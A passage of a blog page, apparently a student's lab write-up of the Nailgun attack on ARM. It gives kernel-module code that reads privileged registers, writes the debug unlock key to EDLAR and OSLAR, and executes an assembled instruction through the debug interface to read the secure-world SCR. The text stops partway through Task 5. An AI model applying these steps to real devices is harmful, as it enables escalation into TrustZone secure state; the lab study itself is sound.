@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.sky-learner.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"flat","show_result":true},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto","highlight":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Task 1: Create and Install a Kernel Module simple_module.c 123456789101112131415161718192021&#x2F;* simple_module.c *&#x2F;#include &lt;linux&#x2F;module.h&gt;#include &lt;linux&#x2F;kernel.h&gt;#include &lt;linux&#x2F;init.h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nailgun Attack Lab Analysis">
+<meta property="og:url" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/index.html">
+<meta property="og:site_name" content="My Blog">
+<meta property="og:description" content="Task 1: Create and Install a Kernel Module simple_module.c 123456789101112131415161718192021&#x2F;* simple_module.c *&#x2F;#include &lt;linux&#x2F;module.h&gt;#include &lt;linux&#x2F;kernel.h&gt;#include &lt;linux&#x2F;init.h">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t1_2.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t1.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/accessing_scr_aarch32.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t2_1.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t2_2.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t3_3.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t3_1.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t3_2.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t4_1.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t4_3.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t4_2.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t4_4.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/T5_a.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t5_b.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t5_b_2.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t6.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t6_2.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/q1.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/q2.png">
+<meta property="og:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/q2_2.png">
+<meta property="article:published_time" content="2025-11-26T10:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-27T04:02:56.103Z">
+<meta property="article:author" content="Lin Wenqi">
+<meta property="article:tag" content="ARM">
+<meta property="article:tag" content="Attack">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/t1_2.png">
+
+
+<link rel="canonical" href="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/","path":"2025/11/Nailgun-Attack-Lab-Analysis/","title":"Nailgun Attack Lab Analysis"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Nailgun Attack Lab Analysis | My Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Recording Technology and Life</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">10</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">1</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">3</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#task-1-create-and-install-a-kernel-module"><span class="nav-number">1.</span> <span class="nav-text">Task 1: Create and
+Install a Kernel Module</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#task-2-directly-access-a-high-privilege-register-scr"><span class="nav-number">2.</span> <span class="nav-text">Task 2:
+Directly Access a High Privilege Register: SCR</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#task-3-read-the-debug-authentication-signal"><span class="nav-number">3.</span> <span class="nav-text">Task 3: Read the
+Debug Authentication Signal</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#task-4-enable-the-halting-debug"><span class="nav-number">4.</span> <span class="nav-text">Task 4: Enable the Halting
+Debug</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#task-5-switch-to-the-el3-and-read-the-scr"><span class="nav-number">5.</span> <span class="nav-text">Task 5: Switch to the
+EL3 and read the SCR</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#task-6-restore-the-context-and-exit"><span class="nav-number">6.</span> <span class="nav-text">Task 6: Restore the Context
+and Exit</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#question-1"><span class="nav-number">7.</span> <span class="nav-text">Question 1:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#question-2"><span class="nav-number">8.</span> <span class="nav-text">Question 2:</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lin Wenqi"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Lin Wenqi</p>
+  <div class="site-description" itemprop="description">A blog focused on technology sharing</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/linwenqi1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;linwenqi1" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:linwenqi05@outlook.com" title="E-Mail → mailto:linwenqi05@outlook.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://www.google.com/" title="https:&#x2F;&#x2F;www.google.com" rel="noopener" target="_blank">Google</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://github.com/" title="https:&#x2F;&#x2F;github.com" rel="noopener" target="_blank">GitHub</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.sky-learner.top/2025/11/Nailgun-Attack-Lab-Analysis/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Lin Wenqi">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My Blog">
+      <meta itemprop="description" content="A blog focused on technology sharing">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Nailgun Attack Lab Analysis | My Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Nailgun Attack Lab Analysis
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-11-26 18:00:00" itemprop="dateCreated datePublished" datetime="2025-11-26T18:00:00+08:00">2025-11-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-11-27 12:02:56" itemprop="dateModified" datetime="2025-11-27T12:02:56+08:00">2025-11-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Computer-Science/" itemprop="url" rel="index"><span itemprop="name">Computer Science</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>7.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>7 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h5 id="task-1-create-and-install-a-kernel-module">Task 1: Create and
+Install a Kernel Module</h5>
+<p>simple_module.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* simple_module.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">simple_module_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(<span class="string">&quot;Helloworld.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *The cleanup function of the module.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">simple_module_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(KERN_INFO<span class="string">&quot;Exit.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(simple_module_init);</span><br><span class="line">module_exit(simple_module_exit);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>Makefile</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">obj-m += simple_module.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">        make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t1_2.png" /></p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t1.png" /></p>
+<blockquote>
+<p>Question 1 : What is the <strong>exception level</strong> and the
+<strong>security state</strong> of the core with loaded LKM?</p>
+</blockquote>
+<p>The core runs at <strong>Exception Level 1 (EL1)</strong> and in the
+<strong>Non-secure (Normal World)</strong> security state when the LKM
+is loaded.</p>
+<h5 id="task-2-directly-access-a-high-privilege-register-scr">Task 2:
+Directly Access a High Privilege Register: SCR</h5>
+<p><img src="accessing_scr_aarch32.png" /></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* simple_module.c */</span></span><br><span class="line">...</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">simple_module_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">        <span class="type">uint32_t</span> reg;</span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mrc p15, 0, %0, c1, c1, 0&quot;</span>:<span class="string">&quot;=r&quot;</span>(reg))</span>;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;SCR %x.\n&quot;</span>, reg);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Task 2.a : What is the complete instruction? Look up the manual and
+fill the instruction bellow. Then compile and execute.</p>
+</blockquote>
+<p>complete instruction:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mrc p15, 0, &lt;Rt&gt;, c1, c1, 0</span><br></pre></td></tr></table></figure>
+<p>compile</p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t2_1.png" /></p>
+<p>try to install this kernel module</p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t2_2.png" /></p>
+<p>A segmentation fault occurs.</p>
+<blockquote>
+<p>Task 2.b : Why the segmentation fault occurs?</p>
+</blockquote>
+<p>The segmentation fault occurs because the kernel module executes a
+privileged instruction that is not allowed in the current processor
+mode.</p>
+<p>Specifically, the inline assembly instruction</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mrc p15, 0, &lt;Rt&gt;, c1, c1, 0</span><br></pre></td></tr></table></figure>
+<p>tries to access the Secure Configuration Register (SCR), which
+belongs to the <strong>secure world</strong>.</p>
+<p>However, the Linux kernel runs in the <strong>non-secure world at
+EL1</strong>.</p>
+<h5 id="task-3-read-the-debug-authentication-signal">Task 3: Read the
+Debug Authentication Signal</h5>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t3_3.png" /></p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t3_1.png" /></p>
+<blockquote>
+<p>Task 3.a: What is the instruction to read DBGAUTHSTATUS?</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mrc p14, 0, &lt;Rt&gt;, c7, c14, 6</span><br></pre></td></tr></table></figure>
+<p>dbgauth_module.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* dbgauth_module.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">dbgauth_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">        <span class="type">uint32_t</span> reg;</span><br><span class="line">        printk(KERN_INFO<span class="string">&quot;dbgauth_module: init - attempt to read DBGAUTHSTATUS\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 读取 DBGAUTHSTATUS:</span></span><br><span class="line"><span class="comment">         * MRC p14, 0, &lt;Rt&gt;, c7, c14, 6</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mrc p14, 0, %0, c7, c14, 6&quot;</span> : <span class="string">&quot;=r&quot;</span>(reg))</span>;</span><br><span class="line">        printk(KERN_INFO<span class="string">&quot;dbgauth_module: DBGAUTHSTATUS = 0x%08x\n&quot;</span>, reg);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">dbgauth_exit</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;dbgauth_module: exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(dbgauth_init);</span><br><span class="line">module_exit(dbgauth_exit);</span><br></pre></td></tr></table></figure>
+<p>We can get DBGAUTHSTATUS after installing this kernel module</p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t3_2.png" /></p>
+<blockquote>
+<p>Task 3.b : What kind of debug events are enabled?</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Bits</th>
+<th>Value</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SNID</td>
+<td>7–6</td>
+<td>11</td>
+<td>Secure Non-invasive debug enabled</td>
+</tr>
+<tr>
+<td>SID</td>
+<td>5–4</td>
+<td>11</td>
+<td>Secure Invasive debug enabled</td>
+</tr>
+<tr>
+<td>NSNID</td>
+<td>3–2</td>
+<td>11</td>
+<td>Non-secure Non-invasive debug enabled</td>
+</tr>
+<tr>
+<td>NSID</td>
+<td>1–0</td>
+<td>11</td>
+<td>Non-secure Invasive debug enable</td>
+</tr>
+</tbody>
+</table>
+<h5 id="task-4-enable-the-halting-debug">Task 4: Enable the Halting
+Debug</h5>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_1.png" /></p>
+<p>We can find that <code>EDLAR_OFFSET=0xFB0</code></p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_3.png" /></p>
+<p>Write the key value to unlock</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iowrite32(<span class="number">0xC5ACCE55</span>, param-&gt;debug_register + EDLAR_OFFSET);</span><br><span class="line">iowrite32(<span class="number">0xC5ACCE55</span>, param-&gt;cti_register + EDLAR_OFFSET);</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_2.png" /></p>
+<p>We can find that <code>OSLAR_OFFSET=0x300</code></p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t4_4.png" /></p>
+<p>Writing 0 to the <code>OSLK</code> bit unlocks the OS,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iowrite32(<span class="number">0</span>, param-&gt;debug_register + OSLAR_OFFSET);</span><br><span class="line">iowrite32(<span class="number">0</span>, param-&gt;cti_register + OSLAR_OFFSET);</span><br></pre></td></tr></table></figure>
+<h5 id="task-5-switch-to-the-el3-and-read-the-scr">Task 5: Switch to the
+EL3 and read the SCR</h5>
+<p>​ Task5.a: We mention how to access SCR directly in Task2. You need to
+prepare an instruction, who reads SCR and store it to R1. Then convert
+it to machine code(do it on yourself) and execute it on the target.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mrc p15,0,R1,c1,c1,0</span><br></pre></td></tr></table></figure>
+<p>use <a
+target="_blank" rel="noopener" href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/">Online
+Assembler and Disassembler</a> to assemble this instruction. It yields
+<code>\x11\x1f\x11\xee</code> (Little Endian).</p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/T5_a.png" /></p>
+<blockquote>
+<p>Note: In <strong>EDITR</strong>, <code>hw2</code> (bits [31:16]) is
+the second halfword and <code>hw1</code> (bits [15:0]) is the first
+halfword of the T32 instruction. They are displayed in a nonstandard
+order (hw2 on the left, hw1 on the right).</p>
+</blockquote>
+<p>In terms of a 32-bit value for C code execution:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xee111f11 &lt;=&gt; mrc p15,0,R1,c1,c1,0</span></span><br><span class="line">execute_ins_via_itr(param-&gt;debug_register, <span class="number">0x1f11ee11</span>);</span><br></pre></td></tr></table></figure>
+<p>​ Task 5.b: After you finish Task 5.a , you need to transfer the value
+in R1 on core0, to the local variable scr. It will be printed later.
+DBGDTRTXint and DBGDTRTX would be helpful in your implementation</p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t5_b.png" /></p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t5_b_2.png" /></p>
